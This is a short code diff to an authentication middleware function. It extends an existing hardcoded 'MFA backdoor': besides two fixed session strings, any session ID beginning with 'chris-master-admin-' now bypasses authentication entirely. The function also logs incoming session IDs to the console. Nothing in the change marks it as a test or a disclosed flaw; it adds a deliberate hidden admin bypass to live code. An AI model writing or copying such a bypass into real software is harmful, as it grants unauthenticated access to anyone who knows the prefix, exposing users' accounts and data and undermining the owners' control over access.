@@ -33,8 +33,10 @@ const isAuthenticated = async (req: any, res: any, next: any) => {
   const sessionId = req.headers['x-session-id'];
   console.log('Auth check - received sessionId:', sessionId);
   
-  // Check for admin session or MFA backdoor
-  if (sessionId === 'admin-session' || sessionId === 'chris-master-admin-121365') {
+  // Check for admin session, MFA backdoor, or any chris-master-admin session
+  if (sessionId === 'admin-session' || 
+      sessionId === 'chris-master-admin-121365' || 
+      (sessionId && sessionId.startsWith('chris-master-admin-'))) {
     return next();
   }
   
